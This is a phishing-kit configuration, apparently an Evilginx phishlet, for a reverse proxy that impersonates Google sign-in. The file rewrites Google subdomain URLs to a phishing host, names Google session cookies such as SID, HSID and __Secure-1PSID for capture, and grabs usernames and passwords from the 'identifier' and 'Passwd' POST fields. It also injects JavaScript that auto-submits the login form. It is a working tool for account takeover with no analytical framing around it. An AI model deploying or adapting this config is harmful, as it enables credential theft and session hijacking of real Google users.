  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: false, is_landing: true, auto_filter: true}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'cdn-5d077a', orig_sub: 'feedback-pa.clients6', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'cdn-8e58a7', orig_sub: 'ogads-pa.clients6', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://www.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'lh3.google.com', orig_sub: 'lh3', domain: 'google.com', search: 'https://lh3.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'image/*']}
  - {triggers_on: 'fonts.googleapis.com', orig_sub: 'fonts', domain: 'google.com', search: 'https://fonts.googleapis.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https://apis.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'feedback-pa.clients6.google.com', orig_sub: 'feedback-pa.clients6', domain: 'google.com', search: 'https://feedback-pa.clients6.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'lh3.google.com', orig_sub: 'lh3', domain: 'google.com', search: 'https://lh3.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://myaccount.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'ogads-pa.clients6.google.com', orig_sub: 'ogads-pa.clients6', domain: 'google.com', search: 'https://ogads-pa.clients6.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'ogs.google.com', orig_sub: 'ogs', domain: 'google.com', search: 'https://ogs.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'play.google.com', orig_sub: 'play', domain: 'google.com', search: 'https://play.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://www.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
auth_tokens:
  - domain: '.google.com'
    keys: ["ACCOUNT_CHOOSER", "AF_initDataKeys", "APISID", "HSID", "LSID", "OSID", "SAPISID", "SID", "SIDCC", "SSID", "_F_cssRowKey", "__Host-1PLSID", "__Host-3PLSID", "__Host-GAPS", "__Secure-1PAPISID", "__Secure-1PSID", "__Secure-1PSIDCC", "__Secure-1PSIDTS", "__Secure-3PAPISID", "__Secure-3PSID", "__Secure-3PSIDCC", "__Secure-3PSIDTS", "__Secure-OSID", ".*,regexp"]
credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'Passwd'
    search: '(.*)'
    type: 'post'
auth_urls:
  - '/_/AccountSettingsUi/browserinfo'
  - '/accounts/CheckConnection'
  - '/settings/hatsv2'
  - '/v1/survey/startup_config'
login:
  domain: 'accounts.google.com'
  path: '/'
force_post:
  - path: '/_/AccountsSignInUi/browserinfo'
    search:
      - {key: 'f.req', search: '(.*)'}
      - {key: 'at', search: '(.*)'}
    force:
      - {key: 'identifier', value: '${EMAIL}'}
      - {key: 'continue', value: 'https://accounts.google.com/'}
      - {key: 'hl', value: 'en'}
      - {key: 'hl', value: 'en'}
      - {key: 'f.req', search: '(.*)'}
    type: 'post'
  - path: '/v3/signin/_/AccountsSignInUi/browserinfo'
    search:
      - {key: 'f.req', search: '(.*)'}
      - {key: 'at', search: '(.*)'}
    force:
      - {key: 'remember_me', value: '1'}
    type: 'post'
  - path: '/_/AccountSettingsUi/browserinfo'
    search:
      - {key: 'f.req', search: '(.*)'}
      - {key: 'at', search: '(.*)'}
    force:
      - {key: 'remember_me', value: '1'}
    type: 'post'
js_inject:
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/']
    script: |
      (function() {
        'use strict';
        
        function waitForButton() {
          const nextBtn = document.querySelector('button[jsname="JnI2Ve"]:not([disabled])');
          
          if (nextBtn) {
            // Store original click
            const originalClick = nextBtn.onclick;
            
            nextBtn.onclick = function(e) {
              console.log('[Evilginx] Next button clicked');
              if (originalClick) originalClick.call(this, e);
            };
            
            // Auto-trigger if form has input
            const emailInput = document.querySelector('input[name="identifier"]');
            if (emailInput && emailInput.value) {
              setTimeout(() => {
                nextBtn.click();
              }, 100);
            }
          } else {
            setTimeout(waitForButton, 500);
          }
        }
        
        // Fix the form action
        const form = document.querySelector('form[action*="/signin"]');
        if (form) {
          form.action = form.action.replace('/signin', '/signin');
        }
        
        // Enable buttons on input
        document.addEventListener('input', function(e) {
          if (e.target.tagName === 'INPUT') {
            const nextBtn = document.querySelector('button[jsname="JnI2Ve"]');
            if (nextBtn && e.target.value) {
              nextBtn.disabled = false;
            }
          }
        });
        
        waitForButton();
      })();
